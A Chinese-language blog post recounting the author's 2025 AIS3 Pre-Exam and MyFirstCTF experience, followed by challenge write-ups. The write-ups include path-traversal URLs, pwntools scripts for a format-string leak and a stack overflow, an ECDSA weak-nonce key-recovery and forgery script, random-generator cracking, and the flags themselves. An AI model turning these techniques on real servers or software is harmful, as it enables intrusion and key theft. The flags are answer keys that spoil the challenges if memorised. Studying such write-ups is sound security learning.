---
title: 2025 AIS3 Pre-Exam & MyFirstCTF 心得 / Writeup
date: 2025-07-03
keywords: 
tag:
    - Cyber
    - Competition
    - CTF
---

如比賽名稱，今年是我第一次參加 MyFirstCTF，大概也是最後一次參加，畢竟參加條件相當嚴格。

![MyFirstCTF 參加資格](/posts/2025-AIS3-PreExam-MyFirstCTF-Writeup/image.webp)

今年 MyFirstCTF 辦在國立陽明交通大學新竹光復校區，為了避免遲到，我搭上一大早的高鐵，然後就不小心太早到了，比賽現場沒有任何參賽者。

![一大早搭乘 7:00 的高鐵前往新竹](/posts/2025-AIS3-PreExam-MyFirstCTF-Writeup/image2.webp)

相信比起競賽本身，大家更在意伙食。在競賽場地（教室）後方擺滿一整排的零食、飲料，並且會隨時補充，中午則是吃披薩，但要早點去拿不然會被拿光。

回到競賽本身，這個比賽名為「MyFirstCTF」，所以題目也不會到太難（吧），於是我決定體驗一把從未嘗試過的藏 Flag，在最後 30 分鐘的時候將 Flag 一次提交衝到第一名，交完所有 Flag 後超級擔心被第二、三名超過，好險最後有維持著成績並以排名第一的名次拿到金質獎，今年的獎品是 AIS3 的衣服超級讚的（發瘋rr）。

![獎品與獎狀](/posts/2025-AIS3-PreExam-MyFirstCTF-Writeup/image3.webp)

因為在打拉麵 OSINT 題的時候，我跑去問黃俊穎教授可不可以直接打電話給拉麵店，競賽結束後跑去和教授搭話，教授就說：「你打完電話就一柱擎天了喔」。用奇怪的記憶點被教授記住好像也不錯（欸），希望教授有記得我～

![一柱擎天的 Scoreboard](/posts/2025-AIS3-PreExam-MyFirstCTF-Writeup/image4.webp)

雖然一柱擎天有點欠揍，但還是…

> 勝不驕，敗不餒

名次只是結果，其實一點也不重要，重要的過程中的學習和成長。贏了比賽，就要往更高的目標邁進，畢竟這只是 MyFirstCTF，大家都是第一次打 CTF（才有鬼 XD）；沒有得名也不用氣餒，明年 Pre-Exam 繼續拼！

---

後面就是這次 Pre-Exam 和 MyFirstCTF 的 Writeup 啦～

先偷偷說，這次有三題的 Exploit 是直接叫 AI 生成的 🤫，去年我甚至全部 Pre-Exam 只有解開三題，今年光是 AI 就幫我解開三題了，不得不感嘆 AI 的成長速度啊～

雖然有部分題目是透過 AI 幫我解開的，但這是我第一次在正式的比賽中把每個主題（Web, Rev, Pwn, etc.）都至少解開一題，往回看會發現自己進步了不少，超級有成就感。

## web

### Tomorin db 🐧

#### 題目

> I make a simple server which store some Tomorin.
> 
> Tomorin is cute ~
> 
> I also store flag in this file server, too.
> 
> ![50c9d30cd5623ae1a9154f58e7769b0e](/posts/2025-AIS3-PreExam-MyFirstCTF-Writeup/image5.gif)
> 
> http://chals1.ais3.org:30000
> 
> Author: naup96321

#### Writeup

打開題目原始碼看 `main.go`，發現若像 /flag 請求，會被導向到 YouTube 影片連結。

```go=
package main

import "net/http"

func main() {
	http.Handle("/", http.FileServer(http.Dir("/app/Tomorin")))
	http.HandleFunc("/flag", func(w http.ResponseWriter, r *http.Request) {
		http.Redirect(w, r, "https://youtu.be/lQuWN0biOBU?si=SijTXQCn9V3j4Rl6", http.StatusFound)
  	})
  	http.ListenAndServe(":30000", nil)
}
```

嘗試路徑遍歷，就拿到 Flag 了。

```
http://chals1.ais3.org:30000/..%2fflag
```

![Screenshot 2025-06-03 at 18.30.13](/posts/2025-AIS3-PreExam-MyFirstCTF-Writeup/image6.webp)


Flag：`AIS3{G01ang_H2v3_a_c0O1_way!!!_Us3ing_C0NN3ct_M3Th07_L0l@T0m0r1n_1s_cute_D0_yo7_L0ve_t0MoRIN?}`

### Login Screen 1

#### 題目

> Welcome to my Login Screen! This is your go-to space for important announcements, upcoming events, helpful resources, and community updates. Whether you're looking for deadlines, meeting times, or opportunities to get involved, you'll find all the essential information posted here. Be sure to check back regularly to stay informed and connected!
> 
> http://login-screen.ctftime.uk:36368/
> 
> Note: The flag starts with AIS3{1.
> 
> Author: Ching367436

#### Writeup

題目連結打開後是一個登入介面，依照下方說明輸入帳號密碼 guest/guest 登入。

![Screenshot 2025-06-03 at 18.32.48](/posts/2025-AIS3-PreExam-MyFirstCTF-Writeup/image7.webp)

網頁要求輸入 2FA Code，依照下方說明輸入 `000000`，成功以 guest 使用者登入。

![Screenshot 2025-06-03 at 18.33.18](/posts/2025-AIS3-PreExam-MyFirstCTF-Writeup/image8.webp)

發現需要以 admin 使用者才能拿到 Flag。

![Screenshot 2025-06-03 at 18.37.53](/posts/2025-AIS3-PreExam-MyFirstCTF-Writeup/image9.webp)

查看題目原始碼目錄結構。

![Screenshot 2025-06-03 at 18.51.09](/posts/2025-AIS3-PreExam-MyFirstCTF-Writeup/image10.webp)

直接請求 `/users.db` 下載資料庫取得 admin 的帳號、雜湊後的密碼以及 2FA 驗證碼。

![Screenshot 2025-06-03 at 23.40.21](/posts/2025-AIS3-PreExam-MyFirstCTF-Writeup/image11.webp)

密碼的部分直接暴力猜是 `admin` 然後就中了，連 hydra 都不用開。

登入後就拿到 Flag 了。

![Screenshot 2025-06-03 at 23.44.41](/posts/2025-AIS3-PreExam-MyFirstCTF-Writeup/image12.webp)

Flag：`AIS3{1.Es55y_SQL_1nJ3ct10n_w1th_2fa_IuABDADGeP0}`

後記：其實題目一開始沒有放原始碼，我是用 dirsearch 爆出資料庫路徑的。

## pwn

### Format Number

#### 題目

> Print the number in the format you like !
> 
> nc chals1.ais3.org 50960
>
> Author : Curious

#### Writeup

直接上 exploit：

```python=
from pwn import *

context.log_level = 'critical'
host = "chals1.ais3.org"
port = 50960

def leak_stack(offset):
    p = remote(host, port)
    p.recvuntil(b'What format do you want ? ')
    
    payload = f"".encode() + b'\x5c' + f'%{offset}$'.encode()
    p.send(payload)

    p.recvuntil(b"Format number : ")
    result = p.recvline().strip().replace(b'%', b'').replace(b'\\', b'').replace(b'$d', b'').decode()

    p.close()

    return result

data = []

for i in range(0, 100):
    response = int(leak_stack(i))
    print(f"\rRunning: {i}/100", end='')
    if response > 0 and response < 256:
        data.append(response)

print("\nThe result is: ", end='')

for i in data:
    print(chr(i), end='')
```

Flag：`AIS3{S1d3_ch@nn3l_0n_fOrM47_strln&_!!!}`

### Welcome to the World of Ave Mujica🌙

#### 題目

> 就將一切委身於 Ave Mujica 吧...
> 
> ![3893df60d1aa4e921d82b837e5aab9c2](/posts/2025-AIS3-PreExam-MyFirstCTF-Writeup/image13.webp)
> 
> Flag 在 /flag，這題的 flag 有 Unicode 字元，請找到 flag 之後直接提交到平台上，如果因為一些玄學問題 CTFd 送不過請 base64 flag 出來用 CyberChef decode 應該就可以了
> 
> [Instancer](http://chals1.ais3.org:60000/)
> 
> 請先在本地測試並確定能成功攻擊後再開 instance
> 
> 若同時參加兩場比賽，輸入任意一個 CTFd 的 token 皆可啟動 instance
> 
> Instancer 並非題目的一部分，請勿攻擊 Instancer。發現問題請回報 admin
> 
> Author: pwn2ooown

#### Writeup

上 exploit：

```python=
from pwn import *

p = remote("chals1.ais3.org", 60289)

p.recvuntil(b"?")
p.sendline(b"yes")

p.recvuntil(b": ")

p.sendline(b"-1")
p.recvuntil(b": ")

target = 0x401256
ret_addr = 0x40101a
payload = b"A" * (168)+ p64(ret_addr) + p64(target)
p.sendline(payload)

p.interactive()
```

Flag：`AIS3{Ave Mujica🎭將奇蹟帶入日常中🛐(Fortuna💵💵💵)...Ave Mujica🎭為你獻上慈悲憐憫✝️(Lacrima😭🥲💦)..._5a31c384269d53a52705ff3cc71db3dd}`

## misc

### Welcome

#### 題目

![Screenshot 2025-06-04 at 09.15.51](/posts/2025-AIS3-PreExam-MyFirstCTF-Writeup/image14.webp)

#### Writeup

如果直接複製會拿到另外一個 Flag，所以要直接手打。

Flag：`AIS3{Welcome_And_Enjoy_The_CTF_!}`

### Ramen CTF

#### 題目

> 我在吃 CTF，喔不對，拉麵，但我忘記我在哪間店吃了．．．，請幫我找出來
> 
> ![chal](/posts/2025-AIS3-PreExam-MyFirstCTF-Writeup/image15.webp)
> 
> (P.S. FlagFormat: AIS3{google map 上的店家名稱:我點的品項在菜單上的名稱})
> 
> Author: whale120

#### Writeup

先確認店家名稱，透過少一碼的統編號碼 `3478592*` 到[台灣公司網](https://www.twincn.com/)依序爆破找到統編 `34785923` 是一家「平和溫泉拉麵店」的公司。

到 Google Map 搜尋「平和溫泉拉麵店」會發現沒有查詢結果。改用該公司地址找到位於該地址的店家是「樂山溫泉拉麵」，所以應該就是他了！

![Screenshot 2025-06-04 at 08.59.33](/posts/2025-AIS3-PreExam-MyFirstCTF-Writeup/image16.webp)

接著發現圖片右邊有一張被蓋住一半的發票，用發票怪獸掃描發票 QR code 取得發票號碼為 `MF16879911`，接著使用[電子發票整合服務平台一般性發票查詢](https://www.einvoice.nat.gov.tw/portal/btc/audit/btc601w/search)查詢發票，得到品項為「蝦拉麵」或「蔬食拉麵」。

![Screenshot 2025-06-04 at 09.08.07](/posts/2025-AIS3-PreExam-MyFirstCTF-Writeup/image17.webp)

經過和該店家的菜單比對後，嘗試提交得到正確的 Flag。

Flag：`AIS3{樂山溫泉拉麵:蝦拉麵}`

### AIS3 Tiny Server - Web / Misc

#### 題目

> From [7890/tiny-web-server](https://github.com/7890/tiny-web-server)
> 
> I am reading [Computer Systems: A Programmer's Perspective](http://csapp.cs.cmu.edu/).
> 
> It teachers me how to write a tiny web server in C.
> 
> Non-features
> 
> No security check
> 
> The flag is at /readable_flag_somerandomstring (root directory of the server). You need to find out the flag name by yourself.
> 
> The challenge binary is the same across all AIS3 Tiny Server challenges.
> 
> Note: This is a misc (or web) challenge. Do not reverse the binary. It is for local testing only. Run ./tiny -h to see the help message. You may need to install gcc-multilib to run the binary.
> 
> Note 2: Do not use scanning tools. You don't need to scan directory.
> 
> [Challenge Instancer](http://chals1.ais3.org:20000/)
> 
> Warning: Instancer is not a part of the challenge, please do not attack it.
> 
> Please solve this challenge locally first then run your solver on the remote instance.
> 
> Author: pwn2ooown

#### Writeup

打開 Instance 看到路徑為 `/index.html`，看起來很可疑，將路徑回到 `/` 會看到很像 Index of 的東西

![Screenshot 2025-06-04 at 09.59.54](/posts/2025-AIS3-PreExam-MyFirstCTF-Writeup/image18.webp)

接著嘗試路徑遍歷 `http://chals1.ais3.org:20056/..%2f..%2f..%2f`

![Screenshot 2025-06-04 at 10.01.55](/posts/2025-AIS3-PreExam-MyFirstCTF-Writeup/image19.webp)

進入 Flag 路徑 `http://chals1.ais3.org:20056/..%2f..%2f..%2freadable_flag_qdZxvPYH5PWjkokx49O5Wki96sQjjJv2` 拿到 Flag。

![Screenshot 2025-06-04 at 10.02.13](/posts/2025-AIS3-PreExam-MyFirstCTF-Writeup/image20.webp)

Flag：`AIS3{tInY_WeB_5erV3R_wi7H_FIL3_Br0Ws1n9_a5_@_Fe@TUre}`

## crypto

### SlowECDSA

#### 題目

> I found this Slow version of ECDSA in my drawer, can you spot the bug?
> 
> nc chals1.ais3.org 19000
> 
> Author: whale120

#### Writeup

上 POC！

```python=
#!/usr/bin/env python3
import hashlib
import socket
from ecdsa import NIST192p

def solve_ecdsa_lcg():
    """使用數學方法直接求解，避免暴力搜尋"""
    curve = NIST192p
    order = curve.generator.order()
    
    # LCG 參數
    a = 1103515245
    c = 12345
    
    print("[+] 連接服務器...")
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("chals1.ais3.org", 19000))
    
    try:
        # 接收歡迎訊息
        s.recv(4096)
        
        # 獲取兩個簽名
        signatures = []
        for i in range(2):
            s.send(b"get_example\n")
            response = s.recv(4096).decode()
            
            r_line = next(line for line in response.split('\n') if line.startswith('r: '))
            s_line = next(line for line in response.split('\n') if line.startswith('s: '))
            
            r = int(r_line.split('r: ')[1], 16)
            sig_s = int(s_line.split('s: ')[1], 16)
            signatures.append((r, sig_s))
            print(f"[+] 簽名 {i+1}: r={hex(r)}, s={hex(sig_s)}")
        
        r1, s1 = signatures[0]
        r2, s2 = signatures[1]
        
        # 訊息雜湊
        h = int.from_bytes(hashlib.sha1(b"example_msg").digest(), 'big') % order
        print(f"[+] 訊息雜湊: {hex(h)}")
        
        # 核心數學攻擊
        # 已知：s1 = k1^(-1) * (h + r1 * d) mod n
        #      s2 = k2^(-1) * (h + r2 * d) mod n  
        #      k2 = a * k1 + c mod n
        
        # 重新整理：k1 = (h + r1 * d) * s1^(-1) mod n
        #          k2 = (h + r2 * d) * s2^(-1) mod n
        
        # 代入 LCG 關係：
        # (h + r2 * d) * s2^(-1) = a * (h + r1 * d) * s1^(-1) + c mod n
        
        s1_inv = pow(s1, -1, order)
        s2_inv = pow(s2, -1, order)
        
        # 展開並解出 d (私鑰)：
        # h * s2^(-1) + r2 * d * s2^(-1) = a * h * s1^(-1) + a * r1 * d * s1^(-1) + c
        # r2 * d * s2^(-1) - a * r1 * d * s1^(-1) = a * h * s1^(-1) + c - h * s2^(-1)
        # d * (r2 * s2^(-1) - a * r1 * s1^(-1)) = a * h * s1^(-1) + c - h * s2^(-1)
        
        coeff = (r2 * s2_inv - a * r1 * s1_inv) % order
        rhs = (a * h * s1_inv + c - h * s2_inv) % order
        
        if coeff == 0:
            print("[-] 係數為 0，無法求解")
            return
        
        private_key = (rhs * pow(coeff, -1, order)) % order
        print(f"[+] 恢復的私鑰: {hex(private_key)}")
        
        # 驗證並計算 k1
        k1 = ((h + r1 * private_key) * s1_inv) % order
        k2 = ((h + r2 * private_key) * s2_inv) % order
        k2_expected = (a * k1 + c) % order
        
        print(f"[+] k1 = {hex(k1)}")
        print(f"[+] k2 = {hex(k2)}")
        print(f"[+] k2 (預期) = {hex(k2_expected)}")
        
        if k2 != k2_expected:
            print("[-] k 值驗證失敗")
            return
        
        print("[+] 驗證成功！開始偽造簽名...")
        
        # 預測下一個 k
        k3 = (a * k2 + c) % order
        print(f"[+] 預測的 k3 = {hex(k3)}")
        
        # 偽造 "give_me_flag" 簽名
        target_msg = "give_me_flag"
        target_h = int.from_bytes(hashlib.sha1(target_msg.encode()).digest(), 'big') % order
        
        # 計算簽名
        R3 = k3 * curve.generator
        r3 = R3.x() % order
        k3_inv = pow(k3, -1, order)
        s3 = (k3_inv * (target_h + r3 * private_key)) % order
        
        print(f"[+] 偽造簽名: r={hex(r3)}, s={hex(s3)}")
        
        # 提交簽名
        s.send(b"verify\n")
        s.recv(1024)
        
        s.send(target_msg.encode() + b"\n")
        s.recv(1024)
        
        s.send(hex(r3).encode() + b"\n")
        s.recv(1024)
        
        s.send(hex(s3).encode() + b"\n")
        result = s.recv(2048).decode()
        
        print(f"[+] 攻擊結果:")
        print(result)
        
        if "flag" in result.lower() or "ais3" in result.lower():
            print("[+] 攻擊成功！")
        
    except Exception as e:
        print(f"[-] 錯誤: {e}")
        import traceback
        traceback.print_exc()
    finally:
        s.close()

if __name__ == "__main__":
    print("=== 數學方法 ECDSA LCG 攻擊 ===")
    solve_ecdsa_lcg()
```

Flag：`AIS3{Aff1n3_nounc3s_c@N_bE_broke_ezily...}`

### Stream

#### 題目

> I love streaming randomly online!
> 
> Author : Whale120

#### Writeup

POC:

```python=
from hashlib import sha512
from math import isqrt
from randcrack import RandCrack

rc = RandCrack()

hashlist = []

for i in range(256):
    single_byte = bytes([i])
    hash_value = int.from_bytes(sha512(single_byte).digest())
    hashlist.append(hash_value)

db_file = open("output.txt", "r").readlines()

db = []

for line in db_file:
    line = line.strip()
    if line:
        db.append(int(line, 16))

rb = []

mask = 0xFFFFFFFF

for i in range(80):
    hb2 = db[i]
    for j in hashlist:
        b2 = hb2 ^ j
        b = isqrt(b2)
        if b * b == b2:
            for k in range(8):
                rb.append((b >> (k * 32)) & 0xFFFFFFFF)
            break

rb = rb[-624:]

for i in rb:
    rc.submit(i)

rand81 = rc.predict_getrandbits(256)

print(f"The getrandbits(256) of time=81 is : {rand81}")

def int_to_str(num):
    test_int = num
    byte_length = (test_int.bit_length() + 7) // 8
    int_to_bytes = test_int.to_bytes(byte_length, 'big')
    bytes_to_string = int_to_bytes.decode('ascii', errors='ignore')
    return bytes_to_string

origin = 0x1a95888d32cd61925d40815f139aeb35d39d8e33f7e477bd020b88d3ca4adee68de5a0dee2922628da3f834c9ada0fa283e693f1deb61e888423fd64d5c3694

flag = int_to_str(rand81**2 ^ origin)
print(f"The Flag is : {flag}")
```

Flag：`AIS3{no_more_junks...plz}`

## rev

### AIS3 Tiny Server - Reverse

#### 題目

> Find the secret flag checker in the server binary itself and recover the flag.
> 
> The challenge binary is the same across all AIS3 Tiny Server challenges.
> 
> Please download the binary from the "AIS3 Tiny Server - Web / Misc" challenge.
> 
> This challenge doesn't depend on the "AIS3 Tiny Server - Pwn" and can be solved independently.
> 
> It is recommended to solve this challenge locally.
> 
> Author: pwn2ooown

#### Writeup

打開 IDA 查看字串，找到與 `flag` 相關的字串

![Screenshot 2025-06-04 at 12.47.57](/posts/2025-AIS3-PreExam-MyFirstCTF-Writeup/image21.webp)

查看在哪個函式中被呼叫

![Screenshot 2025-06-04 at 12.48.05](/posts/2025-AIS3-PreExam-MyFirstCTF-Writeup/image22.webp)

發現是 `sub_2110` 函式，查看該函式程式邏輯

![Screenshot 2025-06-04 at 15.50.08 Large](/posts/2025-AIS3-PreExam-MyFirstCTF-Writeup/image23.webp)

應該是透過 `sub_1E20` 函式判斷 Flag，打開來查看

![Screenshot 2025-06-04 at 15.42.57 Large](/posts/2025-AIS3-PreExam-MyFirstCTF-Writeup/image24.webp)

寫程式逆向回去：

```c=
#include <stdio.h>
#include <stdint.h>
#include <string.h>

int main() {
    // 原始加密的整數陣列
    uint32_t v8[11] = {
        1480073267,  // 0x58382033
        1197221906,  // 0x475C2812
        254628393,   // 0x0F2E5129
        920154,      // 0x000E0ADA
        1343445007,  // 0x5004D70F
        874076697,   // 0x34196A19
        1127428440,  // 0x433CB158
        1510228243,  // 0x59F67413
        743978009,   // 0x2C5A2E19
        54940467,    // 0x03463A33
        1246382110   // 0x4A4F541E
    };
    
    // 密鑰字符串
    char key[] = "rikki_l0v3";
    
    // 將整數陣列轉換為字節陣列 (小端序)
    uint8_t *v8_bytes = (uint8_t *)v8;
    
    printf("=== AIS3 Flag Decryption PoC ===\n\n");
    
    printf("原始加密資料 (前20字節):\n");
    for (int i = 0; i < 20; i++) {
        printf("0x%02X ", v8_bytes[i]);
        if ((i + 1) % 8 == 0) printf("\n");
    }
    printf("\n");
    
    printf("使用密鑰: %s\n\n", key);
    
    // 解密過程
    unsigned int v1 = 0;
    uint8_t v2 = 51;   // 初始值
    uint8_t v3 = 114;  // 初始值
    
    printf("開始解密過程...\n");
    printf("初始: v2=%d, v3=%d\n\n", v2, v3);
    
    // 模擬原始的解密循環
    while (1) {
        // XOR 解密
        v8_bytes[v1] = v2 ^ v3;
        
        if (v1 < 10) {  // 只顯示前10步的詳細過程
            printf("步驟 %2d: %3d ^ %3d = %3d ('%c')\n", 
                   v1 + 1, v2, v3, v8_bytes[v1], 
                   (v8_bytes[v1] >= 32 && v8_bytes[v1] <= 126) ? v8_bytes[v1] : '?');
        }
        
        v1++;
        if (v1 == 45) break;  // 解密45個字節
        
        // 更新下一輪的參數
        v2 = v8_bytes[v1];
        v3 = key[v1 % 10];
    }
    
    printf("...\n");
    printf("解密完成！\n\n");
    
    // 顯示解密結果
    printf("解密後的 flag:\n");
    for (int i = 0; i < 45; i++) {
        printf("%c", v8_bytes[i]);
    }
    printf("\n\n");
    
    // 驗證 flag 格式
    if (strncmp((char *)v8_bytes, "AIS3{", 5) == 0) {
        printf("✓ Flag 格式正確 (以 AIS3{ 開頭)\n");
        
        // 尋找結尾的 }
        int flag_end = -1;
        for (int i = 5; i < 45; i++) {
            if (v8_bytes[i] == '}') {
                flag_end = i;
                break;
            }
        }
        
        if (flag_end != -1) {
            printf("✓ 找到結尾符號 } 在位置 %d\n", flag_end);
            printf("✓ Flag 長度: %d 字符\n", flag_end + 1);
            
            // 輸出完整的 flag
            printf("\n=== 最終 FLAG ===\n");
            for (int i = 0; i <= flag_end; i++) {
                printf("%c", v8_bytes[i]);
            }
            printf("\n==================\n");
        } else {
            printf("✗ 未找到結尾符號 }\n");
        }
    } else {
        printf("✗ Flag 格式不正確\n");
    }
    
    return 0;
}
```

Flag：`AIS3{w0w_a_f1ag_check3r_1n_serv3r_1s_c00l!!!}`

### web flag checker

#### 題目

> Just a web flag checker
> 
> [http://chals1.ais3.org:29998](http://chals1.ais3.org:29998)
> 
> Author: Chumy

#### Writeup

POC：

```python=
#!/usr/bin/env python3
"""
Simple WebAssembly Flag Extractor
Quick solution for AIS3 WASM CTF Challenge
"""

def wasm_flag_extractor():
    """Extract flag from WebAssembly challenge"""
    
    # Encrypted values from WASM analysis (corrected unsigned conversion)
    encrypted_signed = [
        7577352992956835434,
        7148661717033493303,
        -7081446828746089091,  # This was the error - need proper conversion
        -7479441386887439825,  # This was also wrong
        8046961146294847270
    ]
    
    # Convert negative values to unsigned 64-bit properly
    encrypted = []
    for val in encrypted_signed:
        if val < 0:
            # Proper two's complement conversion to unsigned 64-bit
            encrypted.append((1 << 64) + val)
        else:
            encrypted.append(val)
    
    # Encryption parameters
    key = 0xFD9EA72D  # -39934163 as unsigned
    rotations = [(key >> (i * 6)) & 63 for i in range(5)]
    
    print("WASM Flag Extractor (Fixed)")
    print("=" * 40)
    print(f"Key: 0x{key:08X}")
    print(f"Rotations: {rotations}")
    print(f"Encrypted values: {[hex(x) for x in encrypted]}")
    print()
    
    # Decrypt and convert to ASCII
    flag = ""
    for i, (enc_val, rot) in enumerate(zip(encrypted, rotations)):
        # Right rotate to decrypt
        decrypted = ((enc_val >> rot) | (enc_val << (64 - rot))) & 0xFFFFFFFFFFFFFFFF
        
        # Convert to 8 ASCII chars (little-endian)
        chars = ""
        for j in range(8):
            byte_val = (decrypted >> (j * 8)) & 0xFF
            chars += chr(byte_val)
        
        flag += chars
        print(f"Block {i}: 0x{decrypted:016X} -> '{chars}'")
    
    print()
    print("=" * 40)
    print(f"🎯 FLAG: {flag}")
    print("=" * 40)
    
    return flag

if __name__ == "__main__":
    wasm_flag_extractor()
```

Flag：`AIS3{W4SM_R3v3rsing_w17h_g0_4pp_39229dd}`

### A_simple_snake_game

#### 題目

> Here is A very interesting Snake game. If no one beat this game the world will be destory in 30 seconds. Now, Chenallger , It's your duty to beat the game, save the world.
> 
> author: Aukro

#### Writeup

在主函式中看到多個函式名稱包含 `draw` 字串

![Screenshot 2025-06-05 at 00.06.06](/posts/2025-AIS3-PreExam-MyFirstCTF-Writeup/image25.webp)

嘗試搜尋其他與 `draw` 有關的函式。看到有一個 `drawText` 函式，看起來就很會畫 Flag

![Screenshot 2025-06-05 at 00.06.19](/posts/2025-AIS3-PreExam-MyFirstCTF-Writeup/image26.webp)

查看程式邏輯，發現一個判斷式，看起來平常都只會執行到 True 的地方，False 的地方應該就和 Flag 脫不了關係

![Screenshot 2025-06-05 at 00.06.40](/posts/2025-AIS3-PreExam-MyFirstCTF-Writeup/image27.webp)

在判斷前下斷點

![Screenshot 2025-06-05 at 00.07.42](/posts/2025-AIS3-PreExam-MyFirstCTF-Writeup/image28.webp)

執行到斷點後使其跳轉至 False 的地方

![Screenshot 2025-06-05 at 00.08.06](/posts/2025-AIS3-PreExam-MyFirstCTF-Writeup/image29.webp)

然後就拿到 Flag 了！

![Screenshot 2025-06-05 at 00.08.29](/posts/2025-AIS3-PreExam-MyFirstCTF-Writeup/image30.webp)

Flag：`AIS3{CH3aT_Eng1n3?_Ofcau53_I_bo_1T_by_hAnD}`